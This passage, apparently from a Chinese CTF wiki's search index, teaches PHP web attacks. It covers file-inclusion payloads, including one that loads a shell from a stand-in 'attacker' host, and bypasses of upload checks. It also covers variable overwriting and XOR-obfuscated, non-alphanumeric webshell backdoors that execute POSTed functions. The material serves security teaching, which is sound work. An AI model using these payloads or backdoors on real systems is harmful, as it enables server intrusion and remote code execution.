4096\uff0cWindows \u9700\u8981\u957f\u4e8e 256\u3002 * \u70b9\u53f7\u622a\u65ad <pre><code>?file=../../../../../../../../../boot.ini/\u2026\u2026\u2026[\u2026]\u2026\u2026\u2026\u2026\n</code></pre> \u53ea\u9002\u7528 Windows\uff0c\u70b9\u53f7\u9700\u8981\u957f\u4e8e 256\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_4","title":"\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u00b6","text":"<p>\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0cRemote File Inclusion\uff0cRFI\u3002</p> <p><pre><code>&lt;?php\nif ($route == \"share\") {\nrequire_once $basePath . \"/action/m_share.php\";\n} elseif ($route == \"sharelink\") {\nrequire_once $basePath . \"/action/m_sharelink.php\";\n}\n</code></pre> \u6784\u9020\u53d8\u91cf<code>basePath</code>\u7684\u503c\u3002 <pre><code>/?basePath=http://attacker/phpshell.txt?\n</code></pre> \u6700\u7ec8\u7684\u4ee3\u7801\u6267\u884c\u4e86 <pre><code>require_once \"http://attacker/phpshell.txt?/action/m_share.php\";\n</code></pre> \u95ee\u53f7\u540e\u7684\u90e8\u5206\u88ab\u89e3\u91ca\u4e3a URL \u7684 querystring\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u300c\u622a\u65ad\u300d\u3002 * \u666e\u901a\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b <pre><code>?file=[http|https|ftp]://example.com/shell.txt\n</code></pre> \u9700\u8981<code>allow_url_fopen=On</code>\u5e76\u4e14<code>allow_url_include=On</code>\u3002 * \u5229\u7528 PHP \u6d41 input <pre><code>?file=php://input\n</code></pre> \u9700\u8981<code>allow_url_include=On</code>\u3002 * \u5229\u7528 PHP \u6d41 filter <pre><code>?file=php://filter/convert.base64-encode/resource=index.php\n</code></pre> \u9700\u8981<code>allow_url_include=On</code>\u3002 * \u5229\u7528 data URIs <pre><code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=\n</code></pre> \u9700\u8981<code>allow_url_include=On</code>\u3002 * \u5229\u7528 XSS \u6267\u884c <pre><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode\n</code></pre> \u9700\u8981<code>allow_url_fopen=On</code>\uff0c<code>allow_url_include=On</code>\u5e76\u4e14\u9632\u706b\u5899\u6216\u8005\u767d\u540d\u5355\u4e0d\u5141\u8bb8\u8bbf\u95ee\u5916\u7f51\u65f6\uff0c\u5148\u5728\u540c\u7ad9\u70b9\u627e\u4e00\u4e2a XSS \u6f0f\u6d1e\uff0c\u5305\u542b\u8fd9\u4e2a\u9875\u9762\uff0c\u5c31\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u4ee3\u7801\u4e86\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_5","title":"\u6587\u4ef6\u4e0a\u4f20\u00b6","text":"<p>\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307\u7528\u6237\u4e0a\u4f20\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u811a\u672c\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6b64\u6587\u4ef6\u83b7\u5f97\u4e86\u6267\u884c\u670d\u5668\u7aef\u547d\u4ee4\u7684\u80fd\u529b\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u4e00\u822c\u662f\u6307\u4e0a\u4f20 WEB \u811a\u672c\u80fd\u591f\u88ab\u670d\u52a1\u5668\u89e3\u6790\u7684\u95ee\u9898\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684 webshell \u95ee\u9898\u3002\u5b8c\u6210\u8fd9\u4e00\u653b\u51fb\u9700\u8981\u8fd9\u6837\u51e0\u4e2a\u6761\u4ef6\uff0c\u4e00\u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u80fd\u591f\u88ab WEB \u5bb9\u5668\u6267\u884c\uff0c\u5176\u6b21\u7528\u6237\u80fd\u4ece WEB \u4e0a\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6700\u540e\uff0c\u5982\u679c\u4e0a\u4f20\u7684\u6587\u4ef6\u88ab\u5b89\u5168\u68c0\u67e5\u3001\u683c\u5f0f\u5316\u3001\u56fe\u7247\u538b\u7f29\u7b49\u529f\u80fd\u6539\u53d8\u4e86\u5185\u5bb9\uff0c\u5219\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_6","title":"\u7ed5\u8fc7\u4e0a\u4f20\u68c0\u67e5\u00b6","text":"<ul> <li>\u524d\u7aef\u68c0\u67e5\u6269\u5c55\u540d</li> </ul> <p>\u6293\u5305\u7ed5\u8fc7\u5373\u53ef\u3002</p> <ul> <li><code>Content-Type</code>\u68c0\u6d4b\u6587\u4ef6\u7c7b\u578b</li> </ul> <p>\u6293\u5305\u4fee\u6539<code>Content-Type</code>\u7c7b\u578b\uff0c\u4f7f\u5176\u7b26\u5408\u767d\u540d\u5355\u89c4\u5219\u3002</p> <ul> <li>\u670d\u52a1\u7aef\u6dfb\u52a0\u540e\u7f00</li> </ul> <p>\u5c1d\u8bd5<code>%00</code>\u622a\u65ad\u3002</p> <ul> <li>\u670d\u52a1\u7aef\u6269\u5c55\u540d\u68c0\u6d4b</li> </ul> <p>\u5229\u7528\u89e3\u6790\u6f0f\u6d1e\u3002</p> <ul> <li>Apache \u89e3\u6790</li> </ul> <p>Apache \u5bf9\u540e\u7f00\u89e3\u6790\u662f\u4ece\u53f3\u5411\u5de6\u7684</p> <p><code>phpshell.php.rar.rar.rar.rar</code>\u56e0\u4e3a Apache \u4e0d\u8ba4\u8bc6<code>.rar</code>\u8fd9\u4e2a\u6587\u4ef6\u7c7b\u578b\uff0c\u6240\u4ee5\u4f1a\u4e00\u76f4\u904d\u5386\u540e\u7f00\u5230<code>.php</code>\uff0c\u7136\u540e\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a PHP \u6587\u4ef6\u3002</p> <ul> <li>IIS \u89e3\u6790</li> </ul> <p>IIS 6 \u4e0b\u5f53\u6587\u4ef6\u540d\u4e3a<code>abc.asp;xx.jpg</code>\u65f6\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a<code>abc.asp</code>\u3002</p> <ul> <li>PHP CGI \u8def\u5f84\u89e3\u6790</li> </ul> <p>\u5f53\u8bbf\u95ee<code>http://www.a.com/path/test.jpg/notexist.php</code>\u65f6\uff0c\u4f1a\u5c06<code>test.jpg</code>\u5f53\u505a PHP \u89e3\u6790\uff0c<code>notexist.php</code>\u662f\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u3002\u6b64\u65f6 Nginx \u7684\u914d\u7f6e\u5982\u4e0b</p> <p><pre><code>location ~ \\.php$ {\nroot html;\nfastcgi_pass 127.0.0.1:9000;\nfastcgi_index index.php;\nfastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;\ninclude fastcgi_param;\n}\n</code></pre> * \u5176\u4ed6\u65b9\u5f0f</p> <p>\u540e\u7f00\u5927\u5c0f\u5199\u3001\u53cc\u5199\u3001\u7279\u6b8a\u540e\u7f00\u5982<code>php5</code>\u7b49\uff0c\u4fee\u6539\u5305\u5185\u5bb9\u7684\u5927\u5c0f\u5199\u8fc7 WAF \u7b49\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_7","title":"\u53d8\u91cf\u8986\u76d6\u00b6","text":""},{"location":"web_bak/ctf-wiki-web/PHP/#_8","title":"\u5168\u5c40\u53d8\u91cf\u8986\u76d6\u00b6","text":"<p>\u53d8\u91cf\u5982\u679c\u672a\u88ab\u521d\u59cb\u5316\uff0c\u4e14\u80fd\u591f\u88ab\u7528\u6237\u6240\u63a7\u5236\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\u3002</p> <p><pre><code>register_globals=ON\n</code></pre> \u793a\u4f8b <pre><code>&lt;?php\necho \"Register_globals: \" . (int)ini_get(\"register_globals\") . \"&lt;br/&gt;\";\nif ($auth) {\necho \"private!\";\n}\n?&gt;\n</code></pre> \u5f53<code>register_globals=ON</code>\u65f6\uff0c\u63d0\u4ea4<code>test.php?auth=1</code>\uff0c<code>auth</code>\u53d8\u91cf\u5c06\u81ea\u52a8\u5f97\u5230\u8d4b\u503c\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#extract","title":"<code>extract()</code>\u53d8\u91cf\u8986\u76d6\u00b6","text":"<p><code>extract()</code>\u51fd\u6570\u80fd\u591f\u5c06\u53d8\u91cf\u4ece\u6570\u7ec4\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\uff0c\u5176\u5b9a\u4e49\u4e3a</p> <p><pre><code>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )\n</code></pre> \u5176\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u51fd\u6570\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u65f6\u7684\u884c\u4e3a\uff0c\u6700\u5e38\u89c1\u7684\u4e24\u4e2a\u503c\u662f<code>EXTR_OVERWRITE</code>\u548c<code>EXTR_SKIP</code>\u3002 \u5f53\u503c\u4e3a<code>EXTR_OVERWRITE</code>\u65f6\uff0c\u5728\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u53d8\u91cf\u540d\u53d1\u751f\u51b2\u7a81\uff0c\u5219\u8986\u76d6\u6240\u6709\u53d8\u91cf\uff1b\u503c\u4e3a<code>EXTR_SKIP</code>\u5219\u8868\u793a\u8df3\u8fc7\u4e0d\u8986\u76d6\u3002\u82e5\u7b2c\u4e8c\u4e2a\u53c2\u6570\u672a\u6307\u5b9a\uff0c\u5219\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528<code>EXTR_OVERWRITE</code>\u3002</p> <p><pre><code>&lt;?php\n$auth = \"0\";\nextract($_GET);\nif ($auth == 1) {\necho \"private!\";\n} else {\necho \"public!\";\n}\n?&gt;\n</code></pre> \u5f53<code>extract()</code>\u51fd\u6570\u4ece\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u6570\u7ec4\u4e2d\u5bfc\u51fa\u53d8\u91cf\u65f6\uff0c\u53ef\u80fd\u53d1\u751f\u53d8\u91cf\u8986\u76d6\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#import_request_variables","title":"<code>import_request_variables</code>\u53d8\u91cf\u8986\u76d6\u00b6","text":"<p><pre><code>bool import_request_variables (string $types [, string $prefix])\n</code></pre> <code>import_request_variables</code>\u5c06 GET\u3001POST\u3001Cookies \u4e2d\u7684\u53d8\u91cf\u5bfc\u5165\u5230\u5168\u5c40\uff0c\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u53ea\u7528\u7b80\u5355\u5730\u6307\u5b9a\u7c7b\u578b\u5373\u53ef\u3002 <pre><code>&lt;?php\n$auth = \"0\";\nimport_request_variables(\"G\");\nif ($auth == 1) {\necho \"private!\";\n} else {\necho \"public!\";\n}\n?&gt;\n</code></pre> <code>import_request_variables(\"G\")</code>\u6307\u5b9a\u5bfc\u5165 GET \u8bf7\u6c42\u4e2d\u7684\u53d8\u91cf\uff0c\u63d0\u4ea4<code>test.php?auth=1</code>\u51fa\u73b0\u53d8\u91cf\u8986\u76d6\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#parse_str","title":"<code>parse_str()</code>\u53d8\u91cf\u8986\u76d6\u00b6","text":"<p><pre><code>void parse_str ( string $str [, array &amp;$arr ])\n</code></pre> <code>parse_str()</code>\u51fd\u6570\u901a\u5e38\u7528\u4e8e\u89e3\u6790 URL \u4e2d\u7684 querystring\uff0c\u4f46\u662f\u5f53\u53c2\u6570\u503c\u53ef\u4ee5\u88ab\u7528\u6237\u63a7\u5236\u65f6\uff0c\u5f88\u53ef\u80fd\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u3002 <pre><code>// var.php?var=new  \u53d8\u91cf\u8986\u76d6\n$var = \"init\";\nparse_str($_SERVER[\"QUERY_STRING\"]);\nprint $var;\n</code></pre> \u4e0e<code>parse_str()</code>\u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709<code>mb_parse_str()</code>\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_9","title":"\u547d\u4ee4\u6267\u884c\u00b6","text":""},{"location":"web_bak/ctf-wiki-web/PHP/#_10","title":"\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u00b6","text":"<p>PHP \u4e2d\u6709\u4e0d\u5c11\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u7684\u51fd\u6570\u3002</p> <pre><code>eval();\nassert();\nsystem();\nexec();\nshell_exec();\npassthru();\nescapeshellcmd();\npcntl_exec();\n......\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/PHP/#preg_replace","title":"<code>preg_replace()</code>\u4ee3\u7801\u6267\u884c\u00b6","text":"<p><code>preg_replace()</code>\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5982\u679c\u5b58\u5728<code>/e</code>\u6a21\u5f0f\u4fee\u9970\u7b26\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002</p> <p><pre><code>&lt;?php\n$var = \"&lt;tag&gt;phpinfo()&lt;/tag&gt;\";\npreg_replace(\"/&lt;tag&gt;(.*?)&lt;\\/tag&gt;/e\", \"addslashes(\\\\1)\", $var);\n?&gt;\n</code></pre> \u5982\u679c\u6ca1\u6709<code>/e</code>\u4fee\u9970\u7b26\uff0c\u53ef\u4ee5\u5c1d\u8bd5 %00 \u622a\u65ad\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#preg_match","title":"<code>preg_match</code>\u4ee3\u7801\u6267\u884c\u00b6","text":"<p><code>preg_match</code>\u6267\u884c\u7684\u662f\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u5339\u914d\u6210\u529f\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002</p> <p><pre><code>&lt;?php\ninclude 'flag.php';\nif(isset($_GET['code'])){\n$code = $_GET['code'];\nif(strlen($code)&gt;40){\ndie(\"Long.\");\n}\nif(preg_match(\"/[A-Za-z0-9]+/\",$code)){\ndie(\"NO.\");\n}\n@eval($code);\n}else{\nhighlight_file(__FILE__);\n}\n//$hint =  \"php function getFlag() to get flag\";\n?&gt;\n</code></pre> \u8fd9\u9053\u9898\u662f<code>xman</code>\u8bad\u7ec3\u8d5b\u7684\u65f6\u5019\uff0c\u6885\u5b50\u9152\u5e08\u5085\u51fa\u7684\u4e00\u9053\u9898\u3002\u8fd9\u4e00\u4e32\u4ee3\u7801\u63cf\u8ff0\u662f\u8fd9\u6837\u5b50\uff0c\u6211\u4eec\u8981\u7ed5\u8fc7<code>A-Z</code>\u3001<code>a-z</code>\u3001<code>0-9</code>\u8fd9\u4e9b\u5e38\u89c4\u6570\u5b57\u3001\u5b57\u6bcd\u5b57\u7b26\u4e32\u7684\u4f20\u53c2\uff0c\u5c06\u975e\u5b57\u6bcd\u3001\u6570\u5b57\u7684\u5b57\u7b26\u7ecf\u8fc7\u5404\u79cd\u53d8\u6362\uff0c\u6700\u540e\u80fd\u6784\u9020\u51fa<code>a-z</code>\u4e2d\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\uff0c\u5e76\u4e14\u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8e<code>40</code>\u3002\u7136\u540e\u518d\u5229\u7528<code>PHP</code>\u5141\u8bb8\u52a8\u6001\u51fd\u6570\u6267\u884c\u7684\u7279\u70b9\uff0c\u62fc\u63a5\u51fa\u4e00\u4e2a\u51fd\u6570\u540d\uff0c\u8fd9\u91cc\u6211\u4eec\u662f<code>getFlag</code>\uff0c\u7136\u540e\u52a8\u6001\u6267\u884c\u8be5\u4ee3\u7801\u5373\u53ef\u3002 \u90a3\u4e48\uff0c\u6211\u4eec\u9700\u8981\u8003\u8651\u7684\u95ee\u9898\u662f\u5982\u4f55\u901a\u8fc7\u5404\u79cd\u53d8\u6362\uff0c\u4f7f\u5f97\u6211\u4eec\u80fd\u591f\u53bb\u6210\u529f\u8bfb\u53d6\u5230<code>getFlag</code>\u51fd\u6570\uff0c\u7136\u540e\u62ff\u5230<code>webshell</code>\u3002</p> <p>\u5728\u7406\u89e3\u8fd9\u4e2a\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u5927\u5bb6\u4e86\u89e3\u7684\u662f<code>PHP</code>\u4e2d\u5f02\u6216<code>^</code>\u7684\u6982\u5ff5\u3002</p> <p>\u6211\u4eec\u5148\u770b\u4e00\u4e0b\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\uff1a</p> <p><pre><code>&lt;?php\necho \"A\"^\"?\";\n?&gt;\n</code></pre> \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a </p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8f93\u51fa\u7684\u7ed3\u679c\u662f\u5b57\u7b26<code>~</code>\u3002\u4e4b\u6240\u4ee5\u4f1a\u5f97\u5230\u8fd9\u6837\u7684\u7ed3\u679c\uff0c\u662f\u56e0\u4e3a\u4ee3\u7801\u4e2d\u5bf9\u5b57\u7b26<code>A</code>\u548c\u5b57\u7b26<code>?</code>\u8fdb\u884c\u4e86\u5f02\u6216\u64cd\u4f5c\u3002\u5728<code>PHP</code>\u4e2d\uff0c\u4e24\u4e2a\u53d8\u91cf\u8fdb\u884c\u5f02\u6216\u65f6\uff0c\u5148\u4f1a\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210<code>ASCII</code>\u503c\uff0c\u518d\u5c06<code>ASCII</code>\u503c\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u518d\u8fdb\u884c\u5f02\u6216\uff0c\u5f02\u6216\u5b8c\uff0c\u53c8\u5c06\u7ed3\u679c\u4ece\u4e8c\u8fdb\u5236\u8f6c\u6362\u6210\u4e86<code>ASCII</code>\u503c\uff0c\u518d\u5c06<code>ASCII</code>\u503c\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u3002\u5f02\u6216\u64cd\u4f5c\u6709\u65f6\u4e5f\u88ab\u7528\u6765\u4ea4\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c\u3002</p> <p>\u6bd4\u5982\u50cf\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50</p> <p><code>A</code>\u7684<code>ASCII</code>\u503c\u662f<code>65</code>\uff0c\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u503c\u662f<code>01000001</code></p> <p><code>?</code>\u7684 ASCII \u503c\u662f<code>63</code>\uff0c\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u503c\u662f<code>00111111</code></p> <p>\u5f02\u6216\u7684\u4e8c\u8fdb\u5236\u7684\u503c\u662f<code>\u202d01111110\u202c</code>\uff0c\u5bf9\u5e94\u7684<code>ASCII</code>\u503c\u662f<code>126</code>\uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u7684\u503c\u5c31\u662f<code>~</code>\u4e86</p> <p>\u6211\u4eec\u90fd\u77e5\u9053\uff0c<code>PHP</code>\u662f\u5f31\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728<code>PHP</code>\u4e2d\u6211\u4eec\u53ef\u4ee5\u4e0d\u9884\u5148\u58f0\u660e\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u800c\u76f4\u63a5\u58f0\u660e\u4e00\u4e2a\u53d8\u91cf\u5e76\u8fdb\u884c\u521d\u59cb\u5316\u6216\u8d4b\u503c\u64cd\u4f5c\u3002\u6b63\u662f\u7531\u4e8e<code>PHP</code>\u5f31\u7c7b\u578b\u7684\u8fd9\u4e2a\u7279\u70b9\uff0c\u6211\u4eec\u5bf9<code>PHP</code>\u7684\u53d8\u91cf\u7c7b\u578b\u8fdb\u884c\u9690\u5f0f\u7684\u8f6c\u6362\uff0c\u5e76\u5229\u7528\u8fd9\u4e2a\u7279\u70b9\u8fdb\u884c\u4e00\u4e9b\u975e\u5e38\u89c4\u7684\u64cd\u4f5c\u3002\u5982\u5c06\u6574\u578b\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u578b\uff0c\u5c06\u5e03\u5c14\u578b\u5f53\u4f5c\u6574\u578b\uff0c\u6216\u8005\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c\u51fd\u6570\u6765\u5904\u7406\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u770b\u4e00\u6bb5\u4ee3\u7801\uff1a</p> <p><pre><code>&lt;?php\nfunction B(){\necho \"Hello Angel_Kitty\";\n}\n$_++;\n$__= \"?\" ^ \"}\";\n$__();\n?&gt;\n</code></pre> \u4ee3\u7801\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a </p> <p>\u6211\u4eec\u4e00\u8d77\u6765\u5206\u6790\u4e00\u4e0b\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\uff1a</p> <p>1\u3001<code>$_++;</code>\u8fd9\u884c\u4ee3\u7801\u7684\u610f\u601d\u662f\u5bf9\u53d8\u91cf\u540d\u4e3a<code>\"_\"</code>\u7684\u53d8\u91cf\u8fdb\u884c\u81ea\u589e\u64cd\u4f5c\uff0c\u5728<code>PHP</code>\u4e2d\u672a\u5b9a\u4e49\u7684\u53d8\u91cf\u9ed8\u8ba4\u503c<code>null</code>\uff0c<code>null==false==0</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u4f7f\u7528\u4efb\u4f55\u6570\u5b57\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7\u5bf9\u672a\u5b9a\u4e49\u53d8\u91cf\u7684\u81ea\u589e\u64cd\u4f5c\u6765\u5f97\u5230\u4e00\u4e2a\u6570\u5b57\u3002</p> <p>2\u3001<code>$__=\"?\" ^ \"}\";</code>\u5bf9\u5b57\u7b26<code>?</code>\u548c<code>}</code>\u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\uff0c\u5f97\u5230\u7ed3\u679c<code>B</code>\u8d4b\u7ed9\u53d8\u91cf\u540d\u4e3a<code>__</code>(\u4e24\u4e2a\u4e0b\u5212\u7ebf) \u7684\u53d8\u91cf</p> <p>3\u3001<code>$ __ ();</code>\u901a\u8fc7\u4e0a\u9762\u7684\u8d4b\u503c\u64cd\u4f5c\uff0c\u53d8\u91cf<code>$__</code>\u7684\u503c\u4e3a<code>B</code>\uff0c\u6240\u4ee5\u8fd9\u884c\u53ef\u4ee5\u770b\u4f5c\u662f<code>B()</code>\uff0c\u5728<code>PHP</code>\u4e2d\uff0c\u8fd9\u884c\u4ee3\u7801\u8868\u793a\u8c03\u7528\u51fd\u6570<code>B</code>\uff0c\u6240\u4ee5\u6267\u884c\u7ed3\u679c\u4e3a<code>Hello Angel_Kitty</code>\u3002\u5728<code>PHP</code>\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c\u51fd\u6570\u6765\u5904\u7406\u3002</p> <p>\u770b\u5230\u8fd9\u91cc\uff0c\u76f8\u4fe1\u5927\u5bb6\u5982\u679c\u518d\u770b\u5230\u7c7b\u4f3c\u7684<code>PHP</code>\u540e\u95e8\u5e94\u8be5\u4e0d\u4f1a\u90a3\u4e48\u8ff7\u60d1\u4e86\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u4e00\u53e5\u53e5\u7684\u5206\u6790\u540e\u95e8\u4ee3\u7801\u6765\u7406\u89e3\u540e\u95e8\u60f3\u5b9e\u73b0\u7684\u529f\u80fd\u3002</p> <p>\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u8fd9\u79cd\u540e\u95e8\u521b\u5efa\u4e00\u4e9b\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u6d4b\u7684\u5e76\u4e14\u5bf9\u6211\u4eec\u6709\u7528\u7684\u5b57\u7b26\u4e32\uff0c\u5982<code>_POST</code>\uff0c<code>system</code>\uff0c<code>call_user_func_array</code>\uff0c\u6216\u8005\u662f\u4efb\u4f55\u6211\u4eec\u9700\u8981\u7684\u4e1c\u897f\u3002</p> <p>\u4e0b\u9762\u662f\u4e2a\u975e\u5e38\u7b80\u5355\u7684\u975e\u6570\u5b57\u5b57\u6bcd\u7684<code>PHP</code>\u540e\u95e8\uff1a</p> <p><pre><code>&lt;?php\n@$_++; // $_ = 1\n$__=(\"#\"^\"|\"); // $__ = _\n$__.=(\".\"^\"~\"); // _P\n$__.=(\"/\"^\"`\"); // _PO\n$__.=(\"|\"^\"/\"); // _POS\n$__.=(\"{\"^\"/\"); // _POST\n${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);\n?&gt;\n</code></pre> \u5728\u8fd9\u91cc\u6211\u8bf4\u660e\u4e0b\uff0c<code>.=</code>\u662f\u5b57\u7b26\u4e32\u7684\u8fde\u63a5\uff0c\u5177\u4f53\u53c2\u770b<code>PHP</code>\u8bed\u6cd5 \u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u5c06\u4e0a\u9762\u7684\u4ee3\u7801\u5408\u5e76\u4e3a\u4e00\u884c\uff0c\u4ece\u800c\u4f7f\u7a0b\u5e8f\u7684\u53ef\u8bfb\u6027\u66f4\u5dee\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p><pre><code>$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\");\n</code></pre> \u6211\u4eec\u56de\u5230<code>xman</code>\u8bad\u7ec3\u8d5b\u7684\u90a3\u9898\u6765\u770b\uff0c\u6211\u4eec\u7684\u60f3\u6cd5\u662f\u901a\u8fc7\u6784\u9020\u5f02\u6216\u6765\u53bb\u7ed5\u8fc7\u90a3\u4e32\u5b57\u7b26\uff0c\u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u6784\u9020\u8fd9\u4e2a\u5b57\u4e32\u4f7f\u5f97\u957f\u5ea6\u5c0f\u4e8e<code>40</code>\u5462\uff1f \u6211\u4eec\u6700\u7ec8\u662f\u8981\u8bfb\u53d6\u5230\u90a3\u4e2a<code>getFlag</code>\u51fd\u6570\uff0c\u6211\u4eec\u9700\u8981\u6784\u9020\u4e00\u4e2a<code>_GET</code>\u6765\u53bb\u8bfb\u53d6\u8fd9\u4e2a\u51fd\u6570\uff0c\u6211\u4eec\u6700\u7ec8\u6784\u9020\u4e86\u5982\u4e0b\u5b57\u7b26\u4e32\uff1a</p> <p></p> <p>\u53ef\u80fd\u5f88\u591a\u5c0f\u4f19\u4f34\u770b\u5230\u8fd9\u91cc\u4ecd\u7136\u65e0\u6cd5\u7406\u89e3\u8fd9\u6bb5\u5b57\u7b26\u4e32\u662f\u5982\u4f55\u6784\u9020\u7684\u5427\uff0c\u6211\u4eec\u5c31\u5bf9\u8fd9\u6bb5\u5b57\u7b26\u4e32\u8fdb\u884c\u6bb5\u5206\u6790\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_get","title":"\u6784\u9020<code>_GET</code>\u8bfb\u53d6\u00b6","text":"<p>\u9996\u5148\u6211\u4eec\u5f97\u77e5\u9053<code>_GET</code>\u7531\u4ec0\u4e48\u5f02\u6216\u800c\u6765\u7684\uff0c\u7ecf\u8fc7\u6211\u7684\u5c1d\u8bd5\u4e0e\u5206\u6790\uff0c\u6211\u5f97\u51fa\u4e86\u4e0b\u9762\u7684\u7ed3\u8bba\uff1a</p> <p><pre><code>&lt;?php\necho \"`{{{\"^\"?&lt;&gt;/\";//_GET\n?&gt;\n</code></pre> \u8fd9\u6bb5\u4ee3\u7801\u4e00\u5927\u5768\u662f\u5565\u610f\u601d\u5462\uff1f\u56e0\u4e3a 40 \u4e2a\u5b57\u7b26\u957f\u5ea6\u7684\u9650\u5236\uff0c\u5bfc\u81f4\u4ee5\u524d\u9010\u4e2a\u5b57\u7b26\u5f02\u6216\u62fc\u63a5\u7684 webshell \u4e0d\u80fd\u4f7f\u7528\u3002 \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528 php \u4e2d\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u7684\u53cd\u5f15\u53f7<code>``\u548c</code>Linux<code>\u4e0b\u9762\u7684\u901a\u914d\u7b26</code>?`</p> <ul> <li><code>?</code>\u4ee3\u8868\u5339\u914d\u4e00\u4e2a\u5b57\u7b26</li> <li>```\u8868\u793a\u6267\u884c\u547d\u4ee4</li> <li><code>\"</code>\u5bf9\u7279\u6b8a\u5b57\u7b26\u4e32\u8fdb\u884c\u89e3\u6790</li> </ul> <p>\u7531\u4e8e<code>?</code>\u53ea\u80fd\u5339\u914d\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd9\u79cd\u5199\u6cd5\u7684\u610f\u601d\u662f\u5faa\u73af\u8c03\u7528\uff0c\u5206\u522b\u5339\u914d\u3002\u6211\u4eec\u5c06\u5176\u8fdb\u884c\u5206\u89e3\u6765\u770b\uff1a</p> <p><pre><code>&lt;?php\necho \"{\"^\"&lt;\";\n?&gt;\n</code></pre> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a </p> <p><pre><code>&lt;?php\necho \"{\"^\"&gt;\";\n?&gt;\n</code></pre> 